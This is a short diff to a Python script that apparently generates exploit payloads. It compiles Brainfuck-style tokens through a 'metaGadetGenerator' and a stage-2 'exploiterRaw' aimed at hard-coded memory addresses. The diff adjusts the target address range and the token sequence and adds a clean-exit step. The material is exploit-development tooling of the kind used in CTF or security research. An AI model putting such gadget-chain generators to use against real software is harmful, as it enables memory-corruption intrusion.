@@ -37,9 +37,8 @@ if args_dict['output']:
 class compiler:
     DATA_SIZE = 3
 
-    def __init__(self, preprocessor : preprocessor, ea_data, upper : sentenceGenerator = None) -> None:
+    def __init__(self, preprocessor : preprocessor, upper : sentenceGenerator = None) -> None:
         self.preprocessor = preprocessor
-        self.ea_data = ea_data
         self.tokens = '<>+-.,[]'
         self.upper = upper
 
@@ -115,8 +114,8 @@ def initialize_output_file(output_path):
 if output_path != '':
     initialize_output_file(output_path)
 
-repository_start = 0x00000000006C1060
-repository_end = 0x00000000006C5190
+repository_start = 0x00000000006C0000
+repository_end   = 0x00000000006C51C8
 
 repository_size = repository_end - repository_start
 
@@ -136,10 +135,8 @@ stage2Exploiter = exploiterRaw()
 stage2Exploiter.set_output_file(output_path)
 gen2 = metaGadetGenerator(stage2Exploiter)
 
-
-
-pre = preprocessor(0x00000000006C1060)
-bf = compiler(pre, 0x00000000006C1060)
+pre = preprocessor(repository_end - 88)
+bf = compiler(pre)
 
 upperTranslator = sentenceGenerator(gen2, pre)
 bf.upper = upperTranslator
@@ -149,11 +146,13 @@ bf.init()
 
 # Main execution
 bf.upper.mark()
+bf.parse_token('+')
 bf.parse_token('>')
 bf.parse_token('+')
-bf.parse_token('<')
-bf.parse_token('-')
+bf.parse_token('+')
 bf.upper.mark()
+
+bf.upper.exit_clean()
 
 gen2.finalize()
 
